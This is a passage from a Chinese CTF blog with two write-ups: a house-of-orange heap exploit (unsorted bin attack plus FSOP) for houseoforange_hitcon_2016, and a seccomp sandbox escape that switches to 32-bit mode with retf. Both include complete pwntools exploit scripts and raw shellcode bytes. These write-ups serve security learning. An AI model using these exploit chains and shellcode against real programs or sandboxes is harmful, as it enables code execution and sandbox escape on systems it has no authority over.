class="line">  JUMP_INIT(close, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="houseoforange-hitcon-2016"><a href="#houseoforange-hitcon-2016" class="headerlink" title="houseoforange_hitcon_2016"></a>houseoforange_hitcon_2016</h3><h4 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h4><p><img src="/../img/2706180-20220920202755893-646421990.png"></p>
<h4 id="漏洞所在："><a href="#漏洞所在：" class="headerlink" title="漏洞所在："></a>漏洞所在：</h4><p><img src="/../img/2706180-20220920202813042-943539521.png"></p>
<p>在edit函数中，往堆块里写入数据时，又询问了一次size，因此edit函数中存在堆溢出。</p>
<p>不过这道题的难点在于题目中没有free函数，这就意味着我们以前的手法几乎无法利用。而house of orange可以去产生一个位于unsorted bin中的堆块。</p>
<h4 id="利用过程："><a href="#利用过程：" class="headerlink" title="利用过程："></a>利用过程：</h4><h5 id="house-of-orange-1"><a href="#house-of-orange-1" class="headerlink" title="house of orange:"></a>house of orange:</h5><p>因此我们这道题先打一个house of orange，做出来一个被释放掉的堆块再说。</p>
<p>这部分的exp如下：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,d_e,d_a,d_s)</span><br><span class="line">edit(<span class="number">0x40</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0x0000002000000001</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0xfa1</span>))</span><br><span class="line">add(<span class="number">0x1000</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">8</span>)</span><br></pre></td></tr></table></figure>

<p>调试过程如下：</p>
<p><img src="/../img/2706180-20220920202831416-954761380.png"></p>
<p>然后我们申请一个0x1000的堆块，发现top chunk不够用了，就会将旧的top chunk给释放掉(如下)</p>
<p><img src="/../img/image-20221007234332601.png"></p>
<h5 id="泄露地址："><a href="#泄露地址：" class="headerlink" title="泄露地址："></a>泄露地址：</h5><p>此时我们通过打house of orange得到了一个unsorted bin中的堆块，但是为了之后的手法顺利进行，我们还需要拿到一个堆地址和libc地址。而这道题其实还存在一个漏洞，就是忘记在输入函数中输入数据后，给字符串末尾加上\x00了，这就导致了只要让堆块进入unsorted bin中，就会残留fd和bk指针，再次申请的时候即可泄露libc。但是我们还需要堆地址，就需要申请一个largebin size的chunk。</p>
<p>由于最初遍历unsorted bin的时候，会将其中的堆块分类放入small bin或者large bin中，这样程序中那个大堆块就会被分到large bin中，然后启用fd_nextsize和bk_nextsize指针(堆地址就会残留到这上面)</p>
<p>从large bin申请出来的chunk上面残留了libc和堆地址，我们执行show函数即可进行泄露</p>
<p><img src="/../img/2706180-20220920202918866-471108266.png"></p>
<p>这部分exp如下：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x400</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">show()</span><br><span class="line">leak_libc=recv_libc()</span><br><span class="line">libc_base=leak_libc-<span class="number">0x3c5188</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">io_list_all=libc_base+libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">0x20</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;e&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">leak_heap=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;leak_heap&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h5 id="unsorted-bin-attack："><a href="#unsorted-bin-attack：" class="headerlink" title="unsorted bin attack："></a>unsorted bin attack：</h5><p>正如上文提到的，在house of orange之后，我们需要打unsorted bin attack将main_arena+88&#x2F;96的地址写入_IO_list_all。 这里利用溢出，直接去修改chunk的bk指针为_IO_list_all-0x10即可(如下图)</p>
<p><img src="/../img/2706180-20220920203032658-408826904.png"></p>
<p>这样等到下一次malloc申请堆块的时候，就会将main_arena+88的地址写入_IO_list_all（如下）</p>
<p><img src="/../img/image-20221007234402464.png" alt="image-20221007234402464"></p>
<p>由于链表头_IO_list_all已经被篡改，就导致了之后的IO_FILE结构体也都被破坏了，我们看下现在链表上第一个的结构体(如下)</p>
<p><img src="/../img/2706180-20220920203059472-1818877916.png"></p>
<p>现在的chain字段的地址如下</p>
<p><img src="/../img/2706180-20220920222700976-122227575.png"></p>
<p>而这个地址是smallbin中size为0x60的数组的位置，假设我们在smallbin中为0x60的大小的堆块，那我们将堆块申请出来，写入的数据就可以直接控制第二个IO_FILE结构体。让smallbin中出现一个0x60的堆块的方法是提前用edit函数来篡改位于unsorted bin中堆块的size，然后再次调用malloc函数的时候会去遍历各个bins，遍历unsorted bin的时候会将该bins的堆块进行分类(放入small bin或者large bin中)</p>
<p>因为篡改size为0x60，所以该堆块便会进入small bin中size为0x60的链表中。再次分配出来时，我们即可控制第二个IO_FILE结构体。(如下图，此时是堆块进入了smallbin中，可以发现此时的chain字段已经变成了我们堆块的地址)</p>
<p><img src="/../img/image-20221007234456349.png" alt="image-20221007234456349"></p>
<h5 id="FSOP："><a href="#FSOP：" class="headerlink" title="FSOP："></a>FSOP：</h5><p>上图的chain字段成功为堆地址，就说明我们已经可以控制下一个的IO_FILE结构体了，下面说一下如何构造各个字段的值来完成FSOP。</p>
<p>将_flags字段写入&#x2F;bin&#x2F;sh</p>
<p>将 _IO_write_ptr改成0x1 </p>
<p>将 _IO_write_end改成0x0</p>
<p>将_mode改成0</p>
<p>将vtable的地址改成&amp;vtable</p>
<p>然后在vtable字段后再跟16个字节的0最后写上system函数的地址即可。</p>
<p>布局完成后，结构体中的数据应该如下：</p>
<p><img src="/../img/image-20221007234516300.png" alt="image-20221007234516300"></p>
<p>然后等执行libc_message的时候会调用abort最后触发_IO_flush_all_lockp，不过在这之前我们已经布局好了IO_FILE结构体中的各个值。最终到_IO_overflow时触发system(“&#x2F;bin&#x2F;sh\x00”)获取shell。</p>
<p>unsorted bin attack和FSOP攻击都是构造数据在一个payload里的。</p>
<p>payload如下：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;f&#x27;</span>*<span class="number">0x400</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">payload+=p64(sys_addr)+p64(<span class="number">0</span>)</span><br><span class="line">payload+=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x61</span>) <span class="comment">#old top chunk prev_size &amp; size 同时也是fake file的_flags字段</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(io_list_all-<span class="number">0x10</span>) <span class="comment">#old top chunk fd &amp; bk</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)<span class="comment">#_IO_write_base &amp; _IO_write_ptr</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload+=p64(leak_heap+<span class="number">0x430</span>)<span class="comment">#chain</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">13</span></span><br><span class="line">payload+=p64(leak_heap+<span class="number">0x508</span>)<span class="comment">#vtable</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(sys_addr)<span class="comment">#DUMMY finish overflow</span></span><br></pre></td></tr></table></figure>

<p>总结下这题的整体流程：首先利用溢出来篡改top chunk的size字段，申请一个大的size来打一个house of orange让堆块进入unsorted bin中，然后申请出来的size要属于large bin的范围这样就可以同时泄露出libc和堆地址了。此时我们的unsorted bin中依然有堆块，我们去利用溢出打一个unsorted bin attack，将_IO_list_all中写入main_arena+88，这就已经控制了第一个IO_FILE结构体地址了，但是里面的字段我们控制不了，不过该结构体的chain字段地址位于small bin中size为0x60的数组，我们将unsorted bin中这个堆块的size用溢出改为0x61，这样再次申请出来后我们就可以控制第二个IO_FILE结构体了，布置好需要绕过检查的数据最后打一个FSOP即可获取shell。</p>
<h5 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h5><p>house of orange利用过程中，最后程序触发abort刷新流的原因是在unsorted bin attack打完之后 在第二次遍历unsorted bin给堆块分类的时候 由于unsorted bin已经被破坏，然后victim已经是一个libc地址(在下面的这张图片该地址是io_list_all-0x10的地址，这个地址也就是我们篡改bk指针的值)，而其对应的size位是0，从而没有通过检查(如下)，最终触发了abort</p>
<p><img src="/../img/image-20221019205258333.png" alt="image-20221019205258333"></p>
<p><img src="/../img/image-20221019205404478.png" alt="image-20221019205404478"></p>
<h4 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h4><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">d_d=<span class="number">0x400DEE</span></span><br><span class="line">d_a=<span class="number">0x13FD</span></span><br><span class="line">d_e=<span class="number">0x1415</span></span><br><span class="line">d_s=<span class="number">0x1409</span></span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/home/hacker/Desktop/buu64-libc-2.23.so&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice : &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Length of name :&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Name :&#x27;</span>,content)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Price of Orange:&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Color of Orange:&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice : &#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Length of name :&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Name:&#x27;</span>,content)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Price of Orange:&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Color of Orange:&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;4.show\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice : &#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    add(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    edit(<span class="number">0x40</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">0x0000002000000001</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0xfa1</span>))</span><br><span class="line">    add(<span class="number">0x1000</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0x400</span>,<span class="string">&#x27;d&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    show()</span><br><span class="line">    leak_libc=recv_libc()</span><br><span class="line">    libc_base=leak_libc-<span class="number">0x3c5188</span></span><br><span class="line">    log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">    io_list_all=libc_base+libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">    sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    edit(<span class="number">0x20</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    </span><br><span class="line">    show()</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;e&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    leak_heap=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    log_addr(<span class="string">&#x27;leak_heap&#x27;</span>)</span><br><span class="line">    <span class="comment">#debug(p,&#x27;pie&#x27;,d_e,d_a,d_s)</span></span><br><span class="line">    payload=<span class="string">b&#x27;f&#x27;</span>*<span class="number">0x400</span></span><br><span class="line">    payload+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">    payload+=p64(sys_addr)+p64(<span class="number">0</span>)</span><br><span class="line">    payload+=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="number">0x61</span>) <span class="comment">#old top chunk prev_size &amp; size 同时也是fake file的_flags字段</span></span><br><span class="line">    payload+=p64(<span class="number">0</span>)+p64(io_list_all-<span class="number">0x10</span>) <span class="comment">#old top chunk fd &amp; bk</span></span><br><span class="line">    payload+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)<span class="comment">#_IO_write_base &amp; _IO_write_ptr</span></span><br><span class="line">    payload+=p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">    payload+=p64(leak_heap+<span class="number">0x430</span>)<span class="comment">#chain</span></span><br><span class="line">    payload+=p64(<span class="number">0</span>)*<span class="number">13</span></span><br><span class="line">    payload+=p64(leak_heap+<span class="number">0x508</span>)</span><br><span class="line">    payload+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(sys_addr)</span><br><span class="line">    edit(<span class="number">0x1000</span>,payload)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice : &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.interactive()</span><br><span class="line">pwn()</span><br></pre></td></tr></table></figure>

<p><img src="/../img/image-20221007234548743.png" alt="image-20221007234548743"></p>
<h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/218887#h3-5">House of orange - 安全客，安全资讯平台 (anquanke.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45595732/article/details/110173579">(41条消息) FSOP_TTYflag的博客-CSDN博客</a></p>
<p>[]<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-272098.htm#msg_header_h3_16">原创] CTF 中 glibc堆利用 及 IO_FILE 总结-Pwn-看雪论坛-安全社区|安全招聘|bbs.pediy.com</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LynneHuan/p/14696780.html#houseoforange_hitcon_2016">houseoforange_hitcon_2016 - LynneHuan - 博客园 (cnblogs.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/house-of-orange/">House of Orange - CTF Wiki (ctf-wiki.org)</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/cb4bda90.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/cb4bda90.html" class="post-title-link" itemprop="url">沙箱逃逸----切换进程工作模式绕过</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2023-05-15 07:36:47 / 修改时间：08:51:48" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">学习总结</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="写在前面："><a href="#写在前面：" class="headerlink" title="写在前面："></a>写在前面：</h2><p>这两天打CSAW又学到了一种新的沙箱逃逸的方法–切换进程的工作模式，使用32位的系统调用号执行系统调用，来绕过原本沙箱禁用掉的系统调用。理解起来倒也不难，但是有几个点需要注意一下，这里详细的记录下利用过程。</p>
<p>沙箱的基础知识就不再介绍了，不了解的师傅可以自行百度。</p>
<h2 id="利用过程-amp-amp-调试"><a href="#利用过程-amp-amp-调试" class="headerlink" title="利用过程&amp;&amp;调试"></a>利用过程&amp;&amp;调试</h2><p>先看下程序逻辑(如下)，就是输入数据，然后将其执行。在执行前开启了沙箱保护。</p>
<p><img src="/../img/2706180-20220912231002326-165259550.png"></p>
<p>我们看一下本题沙箱禁用的系统调用(如下图)，我们发现没法执行execve，同时禁用了openat和open这两个系统调用，这就意味着orw和execve两种拿到flag的方式都无法使用了。</p>
<p><img src="/../img/2706180-20220912231014492-423761031.png"></p>
<p>这里我们利用一种新的思路来进行沙箱逃逸，观察上图的禁用规则，我们发现并没有检查架构。如果正常检查架构的沙箱规则应该如下：</p>
<p><img src="/../img/2706180-20220912231025985-268851744.png"></p>
<h3 id="控制cs寄存器"><a href="#控制cs寄存器" class="headerlink" title="控制cs寄存器"></a>控制cs寄存器</h3><p>而retf这个指令是相当于pop ip；pop cs</p>
<p>而在x64系统下，进程有两种工作模式(32位工作模式和64位工作模式)。决定了是哪种工作模式的是cs寄存器**(cs&#x3D;0x23 则为32位工作模式，cs&#x3D;0x33 则为64位工作模式)<strong>，如上所说，我们可以用retf指令来控制cs寄存器。而这里要注意，因为我们切换的是32位工作模式，</strong>因此这里的ip寄存器应该是eip寄存器，而cs寄存器本身也是四字节，所以我们想要往eip和cs寄存器填充的两个值一共应该是八字节数据，共占用一个64位程序下的内存单元才对**。</p>
<h3 id="映射小于等于四字节地址"><a href="#映射小于等于四字节地址" class="headerlink" title="映射小于等于四字节地址"></a>映射小于等于四字节地址</h3><p>但是有一点如果切换到32位工作模式后，那寄存器用的则是32位寄存器，原本64位寄存器里装的6字节地址就无法正常使用了，因此在这之前我们需要调用mmap映射一段小于等于四字节的可读可写可执行的内存地址空间，然后我们将执行流迁移到这片区域上，因为地址小于等于四字节放到32位寄存器中也是ok的。</p>
<p><img src="/../img/2706180-20220912231042351-1607796039.png"></p>
<p>上图是执行mmap映射了一段可读可写可执行的区域，下图是执行系统调用read将数据写到刚刚映射出来的这段区域</p>
<p><img src="/../img/2706180-20220912231052458-225522993.png"></p>
<h3 id="切换进程的工作模式"><a href="#切换进程的工作模式" class="headerlink" title="切换进程的工作模式"></a>切换进程的工作模式</h3><p>切换进程的工作模式其实就是用retf指令来控制cs寄存器，不过需要注意的是我们将执行流迁移到新映射的内存区后，将<strong>栈也迁移过来</strong>(因为原本的栈地址是6字节的，我们切换到32位工作模式后无法再访问原本的栈)。<strong>迁移栈的地方要和映射的起始区域错开</strong>，不能将栈进行新的迁移后，执行push时干扰到我们原本布置的指令。</p>
<p>首先是先布置一下eip和cs的数据，先push到栈里(这里一定要注意是二者共用一个内存单元，一个值仅仅占四字节)，举个例子，比如我映射了一段0x100000的内存区域，然后要切换到32位的工作模式上，那么我压入的数据应该是0x2300100000（因为要迁移执行流，所以给eip寄存器的是0x100000）(如下图)</p>
<p><img src="/../img/2706180-20220912231102480-775571867.png"></p>
<p>下图是已经执行了retf，切换到了32位工作模式。(我们观察下面的栈也可以看出来，执行后的栈已经无法使用了，对比上面正常的栈，发现只保留了4字节，这就说明已经切换了32位工作模式)</p>
<p><img src="/../img/2706180-20220912231725874-1239549974.png"></p>
<p>最后就是记得把栈给迁移过来(如下)</p>
<p><img src="/../img/2706180-20220912231124110-1797761142.png"></p>
<h3 id="orw获取flag"><a href="#orw获取flag" class="headerlink" title="orw获取flag"></a>orw获取flag</h3><p>然后打一个常规的32位orw即可。（如下）</p>
<p><img src="/../img/2706180-20220912231132815-1193419232.png"></p>
<h3 id="执行32位下的execve的报错"><a href="#执行32位下的execve的报错" class="headerlink" title="执行32位下的execve的报错"></a>执行32位下的execve的报错</h3><p>最终正常执行我们的32位程序中的系统调用即可，这里要注意一下，我们还是无法执行execve获取shell，因为execve(“&#x2F;bin&#x2F;sh”,0,0)其实是去运行了&#x2F;bin&#x2F;sh这个程序，而这个程序的位数是跟系统一样的。如果是64位系统，那么&#x2F;bin&#x2F;sh这个程序就是64位的(依旧绕不过沙箱)，这样就导致了我们虽然是工作模式切换过来了，但是后续执行&#x2F;bin&#x2F;sh的时候报错了。</p>
<p>执行32位中的execve情况如下：</p>
<p><img src="/../img/2706180-20220912231141493-2079768539.png"></p>
<p>这里要解释一下图中看的明明是执行的munmap，这是因为工作模式虽然切换到32位了，但是这个gdb调试到这里，它依然认为这个系统调用号是64位的，所以就显示了munmap，不过现在确实执行的是32位中的execve系统调用。</p>
<p>可以看见红框里的报错提示，首先第一行我们确实是成功执行了execve(“&#x2F;bin&#x2F;sh”,0,0)，创建了新的进程&#x2F;usr&#x2F;bin&#x2F;dash</p>
<p>但是第二行就报了一个错误，说是Bad system call。这就说明执行了64位的系统调用，然后被沙箱给禁用了。这也就验证了上面所说的&#x2F;bin&#x2F;sh这个程序就是64位的(依旧绕不过沙箱)。</p>
<p>因此我们依旧只能用orw读出flag。</p>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&#x27;chal3&#x27;</span>)</span><br><span class="line"><span class="comment">#debug(p)</span></span><br><span class="line">shellcode=<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov    rax,0x9</span></span><br><span class="line"><span class="string">mov    rsi,0x5000</span></span><br><span class="line"><span class="string">mov    rdi,0x100000</span></span><br><span class="line"><span class="string">mov    rdx,0x7</span></span><br><span class="line"><span class="string">mov    r10,0x21</span></span><br><span class="line"><span class="string">xor    r8,r8</span></span><br><span class="line"><span class="string">xor    r9,r9</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov    rsi,rdi</span></span><br><span class="line"><span class="string">xor    rdi,rdi</span></span><br><span class="line"><span class="string">xor    rax,rax</span></span><br><span class="line"><span class="string">mov    rdx,0x100</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">movabs r8,0x2300100000</span></span><br><span class="line"><span class="string">push   r8</span></span><br><span class="line"><span class="string">retf</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">s=<span class="string">&quot;\x48\xC7\xC0\x09\x00\x00\x00\x48\xC7\xC6\x00\x50\x00\x00\x48\xC7\xC7\x00\x00\x10\x00\x48\xC7\xC2\x07\x00\x00\x00\x49\xC7\xC2\x21\x00\x00\x00\x4D\x31\xC0\x4D\x31\xC9\x0F\x05\x48\x89\xFE\x48\x31\xFF\x48\x31\xC0\x48\xC7\xC2\x00\x01\x00\x00\x0F\x05\x49\xB8\x00\x00\x10\x00\x23\x00\x00\x00\x41\x50\xCB&quot;</span></span><br><span class="line">p.sendline(s)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">orw=<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov    esp,0x100100</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push   0x0</span></span><br><span class="line"><span class="string">push   0x67616c66</span></span><br><span class="line"><span class="string">push   rsp</span></span><br><span class="line"><span class="string">pop    rbx</span></span><br><span class="line"><span class="string">xor    ecx,ecx</span></span><br><span class="line"><span class="string">push   0x5</span></span><br><span class="line"><span class="string">pop    rax</span></span><br><span class="line"><span class="string">int    0x80</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push   rax</span></span><br><span class="line"><span class="string">pop    rbx</span></span><br><span class="line"><span class="string">push   rsp</span></span><br><span class="line"><span class="string">pop    rcx</span></span><br><span class="line"><span class="string">push   0x4000</span></span><br><span class="line"><span class="string">pop    rdx</span></span><br><span class="line"><span class="string">push   0x3</span></span><br><span class="line"><span class="string">pop    rax</span></span><br><span class="line"><span class="string">int    0x80</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push   0x1</span></span><br><span class="line"><span class="string">pop    rbx</span></span><br><span class="line"><span class="string">push   rsp</span></span><br><span class="line"><span class="string">pop    rcx</span></span><br><span class="line"><span class="string">push   0x4000</span></span><br><span class="line"><span class="string">pop    rdx</span></span><br><span class="line"><span class="string">push   0x4</span></span><br><span class="line"><span class="string">pop    rax</span></span><br><span class="line"><span class="string">int    0x80</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">o=<span class="string">&quot;\xBC\x00\x01\x10\x00\x6A\x00\x68\x66\x6C\x61\x67\x54\x5B\x31\xC9\x6A\x05\x58\xCD\x80\x50\x5B\x54\x59\x68\x00\x40\x00\x00\x5A\x6A\x03\x58\xCD\x80\x6A\x01\x5B\x54\x59\x68\x00\x40\x00\x00\x5A\x6A\x04\x58\xCD\x80\xB8\x01\x00\x00\x00\xCD\x80&quot;</span></span><br><span class="line">p.sendline(o)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/vi0let/articles/15978203.html">特殊情况下sandbox的bypass - vi0let - 博客园 (cnblogs.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/4a0a70ddec37">32位64位交叉编码 - 简书 (jianshu.com)</a></p>
<h2 id="题目附件："><a href="#题目附件：" class="headerlink" title="题目附件："></a>题目附件：</h2><p>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1NXZ8zk2CsqUwwkua5QvoFA?pwd=7gt0">https://pan.baidu.com/s/1NXZ8zk2CsqUwwkua5QvoFA?pwd=7gt0</a><br>提取码：7gt0</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/a9dd00f0.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/a9dd00f0.html" class="post-title-link" itemprop="url">关于IO leak的学习总结</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
